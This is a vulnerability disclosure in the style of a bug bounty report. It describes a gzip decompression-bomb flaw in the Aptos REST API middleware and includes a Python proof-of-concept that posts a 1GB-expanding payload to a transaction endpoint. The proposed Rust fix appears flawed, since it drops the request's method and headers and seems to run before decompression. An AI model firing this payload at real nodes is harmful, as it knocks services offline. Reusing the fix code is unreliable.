# Audit Report

## Title
Compression Bomb Vulnerability in REST API Middleware Allows Memory Exhaustion Attack

## Summary
The Aptos REST API's compression middleware is vulnerable to decompression bomb attacks. The `PostSizeLimit` middleware only validates the compressed payload size (via `Content-Length` header) before the `Compression` middleware decompresses the request body, allowing attackers to send small compressed payloads that expand to enormous sizes in memory, causing denial of service.

## Finding Description

The vulnerability exists in the middleware chain configuration in `attach_poem_to_runtime()`. The middleware ordering creates a critical security gap: [1](#0-0) 

In Poem framework, middleware applied with `.with()` executes in reverse order during request processing. This means:

1. **PostSizeLimit executes first** and validates only the `Content-Length` header against the configured limit (default 8MB): [2](#0-1) 

2. **Compression middleware executes second** and decompresses the request body if `Content-Encoding: gzip` is present (no decompression size limit)

3. The **decompressed body** is then passed to endpoint handlers

The size limit configuration shows the default is 8MB: [3](#0-2) 

And compression is enabled by default: [4](#0-3) 

**Attack Scenario:**

An attacker crafts a POST request to any API endpoint (e.g., `/v1/transactions`) with:
- `Content-Length: 8388608` (8MB, just under the limit)
- `Content-Encoding: gzip`
- Body: 8MB of highly compressed data (e.g., gzipped repetitive data that expands to 1-10GB)

The request passes `PostSizeLimit` validation (8MB â‰¤ 8MB), then the `Compression` middleware decompresses the payload to gigabytes, exhausting the API node's memory. Multiple concurrent requests amplify the attack, causing complete API unavailability.

This breaks **Invariant #9: Resource Limits** - the API fails to enforce memory constraints on decompressed request bodies.

## Impact Explanation

**Severity: HIGH**

This vulnerability qualifies as HIGH severity per Aptos bug bounty criteria:
- **"API crashes"**: Memory exhaustion can crash the API service
- **"Validator node slowdowns"**: If validators run API nodes, this affects block production

**Impact scope:**
- All API nodes with default configuration (compression enabled)
- All POST endpoints: transaction submission, batch submission, view functions
- Affects node availability and service reliability
- Can be exploited without authentication or special privileges

While this doesn't directly compromise consensus or funds, it severely impacts network usability and validator operations.

## Likelihood Explanation

**Likelihood: HIGH**

- **Attack complexity**: Low - requires only basic HTTP client capabilities
- **Attacker requirements**: None - API is publicly accessible
- **Detection difficulty**: Moderate - appears as legitimate gzipped traffic
- **Default configuration vulnerable**: Yes - compression enabled by default
- **Exploitability**: Trivial - single malicious POST request can exhaust memory

The attack can be executed by any external actor with network access to the API. No authentication, special permissions, or insider knowledge required.

## Recommendation

**Immediate Fix:** Add decompression size limit enforcement AFTER the Compression middleware or configure Poem's Compression middleware with size limits if supported.

**Option 1: Add decompression size validation middleware**

Create a new middleware that validates the actual body size after decompression and place it AFTER the Compression middleware: [1](#0-0) 

Add a `DecompressionSizeLimit` middleware that checks the actual body size:

```rust
// In api/src/check_size.rs - add new middleware
pub struct DecompressionSizeLimit {
    max_size: u64,
}

impl DecompressionSizeLimit {
    pub fn new(max_size: u64) -> Self {
        Self { max_size }
    }
}

impl<E: Endpoint> Middleware<E> for DecompressionSizeLimit {
    type Output = DecompressionSizeLimitEndpoint<E>;
    
    fn transform(&self, ep: E) -> Self::Output {
        DecompressionSizeLimitEndpoint {
            inner: ep,
            max_size: self.max_size,
        }
    }
}

pub struct DecompressionSizeLimitEndpoint<E> {
    inner: E,
    max_size: u64,
}

impl<E: Endpoint> Endpoint for DecompressionSizeLimitEndpoint<E> {
    type Output = E::Output;
    
    async fn call(&self, req: Request) -> Result<Self::Output> {
        // Check actual body size after decompression
        let body_bytes = req.into_body().into_bytes().await?;
        if body_bytes.len() as u64 > self.max_size {
            return Err(SizedLimitError::PayloadTooLarge.into());
        }
        // Reconstruct request with validated body
        let new_req = Request::builder()
            .body(Body::from(body_bytes));
        self.inner.call(new_req).await
    }
}
```

Then update the middleware chain:

```rust
.with(cors)
.with_if(config.api.compression_enabled, Compression::new())
.with(DecompressionSizeLimit::new(size_limit)) // Add this
.with(PostSizeLimit::new(size_limit))
```

**Option 2: Disable request decompression**

If request compression is not required, configure Poem's Compression middleware to only compress responses, not decompress requests (check Poem documentation for configuration options).

**Long-term:** Conduct a comprehensive review of all size-limiting mechanisms across the API to ensure defense-in-depth against resource exhaustion attacks.

## Proof of Concept

```python
#!/usr/bin/env python3
"""
Compression Bomb PoC for Aptos REST API
Demonstrates memory exhaustion via gzip-compressed payload
"""

import gzip
import requests

# Target API endpoint
API_URL = "http://localhost:8080/v1/transactions"

# Create highly compressible payload (1GB of zeros)
# This compresses to ~1MB with gzip
UNCOMPRESSED_SIZE = 1024 * 1024 * 1024  # 1GB
payload = b'\x00' * UNCOMPRESSED_SIZE

# Compress the payload
compressed = gzip.compress(payload, compresslevel=9)
print(f"Uncompressed size: {UNCOMPRESSED_SIZE:,} bytes")
print(f"Compressed size: {len(compressed):,} bytes")
print(f"Compression ratio: {UNCOMPRESSED_SIZE / len(compressed):.1f}x")

# Send request with Content-Encoding: gzip
# The PostSizeLimit will check compressed size (passes if < 8MB)
# The Compression middleware will decompress to 1GB (memory exhaustion)
headers = {
    'Content-Type': 'application/json',
    'Content-Encoding': 'gzip',
}

try:
    response = requests.post(
        API_URL,
        data=compressed,
        headers=headers,
        timeout=10
    )
    print(f"Response status: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Request failed (API likely crashed): {e}")
```

**Expected behavior:** API node experiences memory exhaustion, becomes unresponsive, or crashes with OOM error.

**To verify in Rust tests:**
1. Deploy local testnet with API enabled
2. Monitor API process memory usage
3. Send multiple concurrent compression bomb requests
4. Observe memory consumption spike and API failure

**Notes:**
- Adjust UNCOMPRESSED_SIZE to stay under PostSizeLimit (default 8MB compressed)
- Multiple concurrent requests amplify the attack
- Real transaction data can also be made highly compressible for more realistic attack

### Citations

**File:** api/src/runtime.rs (L253-256)
```rust
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
```

**File:** api/src/check_size.rs (L43-58)
```rust
    async fn call(&self, req: Request) -> Result<Self::Output> {
        if req.method() != Method::POST {
            return self.inner.call(req).await;
        }

        let content_length = req
            .headers()
            .typed_get::<headers::ContentLength>()
            .ok_or(SizedLimitError::MissingContentLength)?;

        if content_length.0 > self.max_size {
            return Err(SizedLimitError::PayloadTooLarge.into());
        }

        self.inner.call(req).await
    }
```

**File:** config/src/config/api_config.rs (L97-97)
```rust
const DEFAULT_REQUEST_CONTENT_LENGTH_LIMIT: u64 = 8 * 1024 * 1024; // 8 MB
```

**File:** config/src/config/api_config.rs (L125-125)
```rust
            compression_enabled: default_enabled(),
```
